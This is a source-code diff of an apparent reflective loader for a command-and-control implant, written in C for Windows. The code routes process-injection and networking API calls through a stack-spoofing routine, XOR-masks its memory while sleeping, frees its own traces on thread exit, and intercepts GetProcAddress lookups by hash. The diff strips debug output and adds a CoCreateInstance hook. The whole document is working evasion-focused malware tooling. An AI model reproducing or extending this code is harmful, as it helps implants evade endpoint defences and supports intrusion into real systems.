@@ -35,6 +35,7 @@
 /* store resolved functions */
 void * g_InternetOpenA;
 void * g_InternetConnectA;
+void * g_CoCreateInstance;
 void * g_ExitThread;
 
 /* patched in from loader.spec */
@@ -45,18 +46,10 @@ MEMORY_LAYOUT g_layout;
 
 LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualAlloc\n");
-    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
-    dprintf(" -> dwSize           : %d\n", dwSize);
-    dprintf(" -> flAllocationType : %d\n", flAllocationType);
-    dprintf(" -> flProtect        : %d\n", flProtect);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualAlloc);
+    call.function = (PVOID)(KERNEL32$VirtualAlloc);
     call.argc     = 4;
     call.args[0]  = (ULONG_PTR)(lpAddress);
     call.args[1]  = (ULONG_PTR)(dwSize);
@@ -68,19 +61,10 @@ LPVOID WINAPI _VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationT
 
 LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualAllocEx\n");
-    dprintf(" -> hProcess         : 0x%lp\n", hProcess);
-    dprintf(" -> lpAddress        : 0x%lp\n", lpAddress);
-    dprintf(" -> dwSize           : %d\n", dwSize);
-    dprintf(" -> flAllocationType : %d\n", flAllocationType);
-    dprintf(" -> flProtect        : %d\n", flProtect);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualAllocEx);
+    call.function = (PVOID)(KERNEL32$VirtualAllocEx);
     call.argc     = 5;
     call.args[0]  = (ULONG_PTR)(hProcess);
     call.args[1]  = (ULONG_PTR)(lpAddress);
@@ -93,18 +77,10 @@ LPVOID WINAPI _VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
 
 BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualProtect\n");
-    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
-    dprintf(" -> dwSize         : %d\n", dwSize);
-    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
-    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualProtect);
+    call.function = (PVOID)(KERNEL32$VirtualProtect);
     call.argc     = 4;
     call.args[0]  = (ULONG_PTR)(lpAddress);
     call.args[1]  = (ULONG_PTR)(dwSize);
@@ -116,19 +92,10 @@ BOOL WINAPI _VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect,
 
 BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualProtectEx\n");
-    dprintf(" -> hProcess       : 0x%lp\n", hProcess);
-    dprintf(" -> lpAddress      : 0x%lp\n", lpAddress);
-    dprintf(" -> dwSize         : %d\n", dwSize);
-    dprintf(" -> flNewProtect   : %d\n", flNewProtect);
-    dprintf(" -> lpflOldProtect : 0x%lp\n", lpflOldProtect);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualProtectEx);
+    call.function = (PVOID)(KERNEL32$VirtualProtectEx);
     call.argc     = 5;
     call.args[0]  = (ULONG_PTR)(hProcess);
     call.args[1]  = (ULONG_PTR)(lpAddress);
@@ -141,17 +108,10 @@ BOOL WINAPI _VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, 
 
 BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualFree\n");
-    dprintf(" -> lpAddress  : 0x%lp\n", lpAddress);
-    dprintf(" -> dwSize     : %d\n", dwSize);
-    dprintf(" -> dwFreeType : %d\n", dwFreeType);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualFree);
+    call.function = (PVOID)(KERNEL32$VirtualFree);
     call.argc     = 3;
     call.args[0]  = (ULONG_PTR)(lpAddress);
     call.args[1]  = (ULONG_PTR)(dwSize);
@@ -162,16 +122,10 @@ BOOL WINAPI _VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType)
 
 BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
 {
-    #if DEBUG
-    dprintf("[UDRL] _GetThreadContext\n");
-    dprintf(" -> hThread   : 0x%lp\n", hThread);
-    dprintf(" -> lpContext : 0x%lp\n", lpContext);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(GetThreadContext);
+    call.function = (PVOID)(KERNEL32$GetThreadContext);
     call.argc     = 2;
     call.args[0]  = (ULONG_PTR)(hThread);
     call.args[1]  = (ULONG_PTR)(lpContext);
@@ -181,16 +135,10 @@ BOOL WINAPI _GetThreadContext(HANDLE hThread, LPCONTEXT lpContext)
 
 BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
 {
-    #if DEBUG
-    dprintf("[UDRL] _SetThreadContext\n");
-    dprintf(" -> hThread   : 0x%lp\n", hThread);
-    dprintf(" -> lpContext : 0x%lp\n", lpContext);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(SetThreadContext);
+    call.function = (PVOID)(KERNEL32$SetThreadContext);
     call.argc     = 2;
     call.args[0]  = (ULONG_PTR)(hThread);
     call.args[1]  = (ULONG_PTR)(lpContext);
@@ -200,15 +148,6 @@ BOOL WINAPI _SetThreadContext(HANDLE hThread, const CONTEXT *lpContext)
 
 HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
 {
-    #if DEBUG
-    dprintf("[UDRL] _InternetOpenA\n");
-    dprintf(" -> lpszAgent       : %s\n", lpszAgent);
-    dprintf(" -> dwAccessType    : %d\n", dwAccessType);
-    dprintf(" -> lpszProxy       : %s\n", lpszProxy);
-    dprintf(" -> lpszProxyBypass : %s\n", lpszProxyBypass);
-    dprintf(" -> dwFlags         : %d\n", dwFlags);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
@@ -225,18 +164,6 @@ HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lps
 
 HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)
 {
-    #if DEBUG
-    dprintf("[UDRL] _InternetConnectA\n");
-    dprintf(" -> hInternet      : 0x%lp\n", hInternet);
-    dprintf(" -> lpszServerName : %s\n", lpszServerName);
-    dprintf(" -> nServerPort    : %d\n", nServerPort);
-    dprintf(" -> lpszUserName   : %s\n", lpszUserName);
-    dprintf(" -> lpszPassword   : %s\n", lpszPassword);
-    dprintf(" -> dwService      : %d\n", dwService);
-    dprintf(" -> dwFlags        : %d\n", dwFlags);
-    dprintf(" -> dwContext      : 0x%lp\n", dwContext);
-    #endif
-    
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
@@ -256,15 +183,10 @@ HINTERNET WINAPI _InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, I
 
 DWORD WINAPI _ResumeThread(HANDLE hThread)
 {
-    #if DEBUG
-    dprintf("[UDRL] _ResumeThread\n");
-    dprintf(" -> hThread : 0x%lp\n", hThread);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(ResumeThread);
+    call.function = (PVOID)(KERNEL32$ResumeThread);
     call.argc     = 1;
     call.args[0]  = (ULONG_PTR)(hThread);
 
@@ -273,20 +195,10 @@ DWORD WINAPI _ResumeThread(HANDLE hThread)
 
 HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
 {
-    #if DEBUG
-    dprintf("[UDRL] _CreateThread\n");
-    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
-    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
-    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
-    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
-    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
-    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(CreateThread);
+    call.function = (PVOID)(KERNEL32$CreateThread);
     call.argc     = 6;
     call.args[0]  = (ULONG_PTR)(lpThreadAttributes);
     call.args[1]  = (ULONG_PTR)(dwStackSize);
@@ -300,21 +212,10 @@ HANDLE WINAPI _CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwS
 
 HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
 {
-    #if DEBUG
-    dprintf("[UDRL] _CreateRemoteThread\n");
-    dprintf(" -> hProcess           : 0x%lp\n", hProcess);
-    dprintf(" -> lpThreadAttributes : 0x%lp\n", lpThreadAttributes);
-    dprintf(" -> dwStackSize        : %d\n", dwStackSize);
-    dprintf(" -> lpStartAddress     : 0x%lp\n", lpStartAddress);
-    dprintf(" -> lpParameter        : 0x%lp\n", lpParameter);
-    dprintf(" -> dwCreationFlags    : %d\n", dwCreationFlags);
-    dprintf(" -> lpThreadId         : 0x%lp\n", lpThreadId);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(CreateRemoteThread);
+    call.function = (PVOID)(KERNEL32$CreateRemoteThread);
     call.argc     = 7;
     call.args[0]  = (ULONG_PTR)(hProcess);
     call.args[1]  = (ULONG_PTR)(lpThreadAttributes);
@@ -329,17 +230,10 @@ HANDLE WINAPI _CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThrea
 
 HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
 {
-    #if DEBUG
-    dprintf("[UDRL] _OpenProcess\n");
-    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
-    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
-    dprintf(" -> dwProcessId     : %d\n", dwProcessId);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(OpenProcess);
+    call.function = (PVOID)(KERNEL32$OpenProcess);
     call.argc     = 3;
     call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
     call.args[1]  = (ULONG_PTR)(bInheritHandle);
@@ -350,17 +244,10 @@ HANDLE WINAPI _OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwP
 
 HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId)
 {
-    #if DEBUG
-    dprintf("[UDRL] _OpenThread\n");
-    dprintf(" -> dwDesiredAccess : %d\n", dwDesiredAccess);
-    dprintf(" -> bInheritHandle  : %d\n", bInheritHandle);
-    dprintf(" -> dwThreadId      : %d\n", dwThreadId);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(OpenThread);
+    call.function = (PVOID)(KERNEL32$OpenThread);
     call.argc     = 3;
     call.args[0]  = (ULONG_PTR)(dwDesiredAccess);
     call.args[1]  = (ULONG_PTR)(bInheritHandle);
@@ -371,15 +258,10 @@ HANDLE WINAPI _OpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwTh
 
 BOOL WINAPI _CloseHandle(HANDLE hObject)
 {
-    #if DEBUG
-    dprintf("[UDRL] _CloseHandle\n");
-    dprintf(" -> hObject : 0x%lp\n", hObject);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(CloseHandle);
+    call.function = (PVOID)(KERNEL32$CloseHandle);
     call.argc     = 1;
     call.args[0]  = (ULONG_PTR)(hObject);
 
@@ -388,20 +270,10 @@ BOOL WINAPI _CloseHandle(HANDLE hObject)
 
 HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName)
 {
-    #if DEBUG
-    dprintf("[UDRL] _CreateFileMappingA\n");
-    dprintf(" -> hFile                   : 0x%lp\n", hFile);
-    dprintf(" -> lpFileMappingAttributes : 0x%lp\n", lpFileMappingAttributes);
-    dprintf(" -> flProtect               : %d\n", flProtect);
-    dprintf(" -> dwMaximumSizeHigh       : %d\n", dwMaximumSizeHigh);
-    dprintf(" -> dwMaximumSizeLow        : %d\n", dwMaximumSizeLow);
-    dprintf(" -> lpName                  : %s\n", lpName);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(CreateFileMappingA);
+    call.function = (PVOID)(KERNEL32$CreateFileMappingA);
     call.argc     = 6;
     call.args[0]  = (ULONG_PTR)(hFile);
     call.args[1]  = (ULONG_PTR)(lpFileMappingAttributes);
@@ -415,19 +287,10 @@ HANDLE WINAPI _CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMapp
 
 LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap)
 {
-    #if DEBUG
-    dprintf("[UDRL] _MapViewOfFile\n");
-    dprintf(" -> hFileMappingObject   : 0x%lp\n", hFileMappingObject);
-    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
-    dprintf(" -> dwFileOffsetHigh     : %d\n", dwFileOffsetHigh);
-    dprintf(" -> dwFileOffsetLow      : %d\n", dwFileOffsetLow);
-    dprintf(" -> dwNumberOfBytesToMap : %d\n", dwNumberOfBytesToMap);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(MapViewOfFile);
+    call.function = (PVOID)(KERNEL32$MapViewOfFile);
     call.argc     = 5;
     call.args[0]  = (ULONG_PTR)(hFileMappingObject);
     call.args[1]  = (ULONG_PTR)(dwDesiredAccess);
@@ -440,15 +303,10 @@ LPVOID WINAPI _MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, D
 
 BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
 {
-    #if DEBUG
-    dprintf("[UDRL] _UnmapViewOfFile\n");
-    dprintf(" -> lpBaseAddress : 0x%lp\n", lpBaseAddress);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(MapViewOfFile);
+    call.function = (PVOID)(KERNEL32$MapViewOfFile);
     call.argc     = 1;
     call.args[0]  = (ULONG_PTR)(lpBaseAddress);
 
@@ -457,17 +315,10 @@ BOOL WINAPI _UnmapViewOfFile(LPCVOID lpBaseAddress)
 
 SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength)
 {
-    #if DEBUG
-    dprintf("[UDRL] _VirtualQuery\n");
-    dprintf(" -> lpAddress : 0x%lp\n", lpAddress);
-    dprintf(" -> lpBuffer  : 0x%lp\n", lpBuffer);
-    dprintf(" -> dwLength  : %d\n", dwLength);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(VirtualQuery);
+    call.function = (PVOID)(KERNEL32$VirtualQuery);
     call.argc     = 3;
     call.args[0]  = (ULONG_PTR)(lpAddress);
     call.args[1]  = (ULONG_PTR)(lpBuffer);
@@ -478,21 +329,10 @@ SIZE_T WINAPI _VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffe
 
 BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
 {
-    #if DEBUG
-    dprintf("[UDRL] _DuplicateHandle\n");
-    dprintf(" -> hSourceProcessHandle : 0x%lp\n", hSourceProcessHandle);
-    dprintf(" -> hSourceHandle        : 0x%lp\n", hSourceHandle);
-    dprintf(" -> hTargetProcessHandle : 0x%lp\n", hTargetProcessHandle);
-    dprintf(" -> lpTargetHandle       : 0x%lp\n", lpTargetHandle);
-    dprintf(" -> dwDesiredAccess      : %d\n", dwDesiredAccess);
-    dprintf(" -> bInheritHandle       : %d\n", bInheritHandle);
-    dprintf(" -> dwOptions            : %d\n", dwOptions);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(DuplicateHandle);
+    call.function = (PVOID)(KERNEL32$DuplicateHandle);
     call.argc     = 7;
     call.args[0]  = (ULONG_PTR)(hSourceProcessHandle);
     call.args[1]  = (ULONG_PTR)(hSourceHandle);
@@ -507,19 +347,10 @@ BOOL WINAPI _DuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, 
 
 BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead)
 {
-    #if DEBUG
-    dprintf("[UDRL] _ReadProcessMemory\n");
-    dprintf(" -> hProcess            : 0x%lp\n", hProcess);
-    dprintf(" -> lpBaseAddress       : 0x%lp\n", lpBaseAddress);
-    dprintf(" -> lpBuffer            : 0x%lp\n", lpBuffer);
-    dprintf(" -> nSize               : %d\n", nSize);
-    dprintf(" -> lpNumberOfBytesRead : 0x%lp\n", lpNumberOfBytesRead);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(ReadProcessMemory);
+    call.function = (PVOID)(KERNEL32$ReadProcessMemory);
     call.argc     = 5;
     call.args[0]  = (ULONG_PTR)(hProcess);
     call.args[1]  = (ULONG_PTR)(lpBaseAddress);
@@ -532,19 +363,10 @@ BOOL WINAPI _ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lp
 
 BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)
 {
-    #if DEBUG
-    dprintf("[UDRL] _WriteProcessMemory\n");
-    dprintf(" -> hProcess               : 0x%lp\n", hProcess);
-    dprintf(" -> lpBaseAddress          : 0x%lp\n", lpBaseAddress);
-    dprintf(" -> lpBuffer               : 0x%lp\n", lpBuffer);
-    dprintf(" -> nSize                  : %d\n", nSize);
-    dprintf(" -> lpNumberOfBytesWritten : 0x%lp\n", lpNumberOfBytesWritten);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(WriteProcessMemory);
+    call.function = (PVOID)(KERNEL32$WriteProcessMemory);
     call.argc     = 5;
     call.args[0]  = (ULONG_PTR)(hProcess);
     call.args[1]  = (ULONG_PTR)(lpBaseAddress);
@@ -557,11 +379,6 @@ BOOL WINAPI _WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID l
 
 DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
 {
-    #if DEBUG
-    dprintf("[UDRL] _ExitThread\n");
-    dprintf(" -> dwExitCode : %d\n", dwExitCode);
-    #endif
-
     /* is cfg enabled? */
     BOOL cfgEnabled = CfgEnabled();
 
@@ -586,7 +403,7 @@ DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
 
         if (KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)(KERNEL32$RtlCaptureContext), &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD))
         {
-            Sleep(1000);
+            KERNEL32$Sleep(1000);
             
             if (ctx.Rip != 0)
             {
@@ -598,19 +415,19 @@ DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
                 }
 
                 ctxFree[0].Rsp -= sizeof(PVOID);
-                ctxFree[0].Rip = (DWORD64)(VirtualFree);
+                ctxFree[0].Rip = (DWORD64)(KERNEL32$VirtualFree);
                 ctxFree[0].Rcx = (DWORD64)(g_layout.dll.baseAddress);
                 ctxFree[0].Rdx = (DWORD64)(0);
                 ctxFree[0].R8  = (DWORD64)(MEM_RELEASE);
 
                 ctxFree[1].Rsp -= sizeof(PVOID);
-                ctxFree[1].Rip = (DWORD64)(VirtualFree);
+                ctxFree[1].Rip = (DWORD64)(KERNEL32$VirtualFree);
                 ctxFree[1].Rcx = (DWORD64)(g_layout.hooks.baseAddress);
                 ctxFree[1].Rdx = (DWORD64)(0);
                 ctxFree[1].R8  = (DWORD64)(MEM_RELEASE);
 
                 ctxFree[2].Rsp -= sizeof(PVOID);
-                ctxFree[2].Rip = (DWORD64)(VirtualFree);
+                ctxFree[2].Rip = (DWORD64)(KERNEL32$VirtualFree);
                 ctxFree[2].Rcx = (DWORD64)(g_layout.pic.baseAddress);
                 ctxFree[2].Rdx = (DWORD64)(0);
                 ctxFree[2].R8  = (DWORD64)(MEM_RELEASE);
@@ -634,24 +451,10 @@ DECLSPEC_NORETURN VOID WINAPI _ExitThread(DWORD dwExitCode)
 
 BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
 {
-    #if DEBUG
-    dprintf("[UDRL] _CreateProcessA\n");
-    dprintf(" -> lpApplicationName    : %s\n", lpApplicationName);
-    dprintf(" -> lpCommandLine        : %s\n", lpCommandLine);
-    dprintf(" -> lpProcessAttributes  : 0x%lp\n", lpProcessAttributes);
-    dprintf(" -> lpThreadAttributes   : 0x%lp\n", lpThreadAttributes);
-    dprintf(" -> bInheritHandles      : %d\n", bInheritHandles);
-    dprintf(" -> dwCreationFlags      : %d\n", dwCreationFlags);
-    dprintf(" -> lpEnvironment        : 0x%lp\n", lpEnvironment);
-    dprintf(" -> lpCurrentDirectory   : %s\n", lpCurrentDirectory);
-    dprintf(" -> lpStartupInfo        : 0x%lp\n", lpStartupInfo);
-    dprintf(" -> lpProcessInformation : 0x%lp\n", lpProcessInformation);
-    #endif
-
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(CreateProcessA);
+    call.function = (PVOID)(KERNEL32$CreateProcessA);
     call.argc     = 10;
     call.args[0]  = (ULONG_PTR)(lpApplicationName);
     call.args[1]  = (ULONG_PTR)(lpCommandLine);
@@ -665,6 +468,22 @@ BOOL WINAPI _CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSEC
     call.args[9]  = (ULONG_PTR)(lpProcessInformation);
 
     return (BOOL)draugr(&call);
+}
+
+HRESULT _CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv)
+{
+    FUNCTION_CALL call;
+    memset(&call, 0, sizeof(FUNCTION_CALL));
+
+    call.function = (PVOID)(g_CoCreateInstance);
+    call.argc     = 5;
+    call.args[0]  = (ULONG_PTR)(rclsid);
+    call.args[1]  = (ULONG_PTR)(pUnkOuter);
+    call.args[2]  = (ULONG_PTR)(dwClsContext);
+    call.args[3]  = (ULONG_PTR)(riid);
+    call.args[4]  = (ULONG_PTR)(ppv);
+
+    return (HRESULT)draugr(&call);
 }
 
 void applyxor(char * data, DWORD len)
@@ -718,25 +537,20 @@ void xormemory(BOOL mask) {
 
 VOID WINAPI _Sleep(DWORD dwMilliseconds)
 {
-    #if DEBUG
-    dprintf("[UDRL] _Sleep\n");
-    dprintf(" -> dwMilliseconds : %d\n", dwMilliseconds);
-    #endif
-
     /*
     * only xor and stack spoof if
     * sleep is >= 1s
     */
 
     if (dwMilliseconds < 1000) {
-        Sleep(dwMilliseconds);
+        KERNEL32$Sleep(dwMilliseconds);
         return;
     }
     
     FUNCTION_CALL call;
     memset(&call, 0, sizeof(FUNCTION_CALL));
 
-    call.function = (PVOID)(Sleep);
+    call.function = (PVOID)(KERNEL32$Sleep);
     call.argc     = 1;
     call.args[0]  = (ULONG_PTR)(dwMilliseconds);
 
@@ -859,6 +673,10 @@ char * WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
     }
     else if (h == SLEEP_HASH) {
         return (char *)_Sleep;
+    }
+    else if (h == COCREATEINSTANCE_HASH) {
+        g_CoCreateInstance = result;
+        return (char *)_CoCreateInstance;
     }
 
     return result;
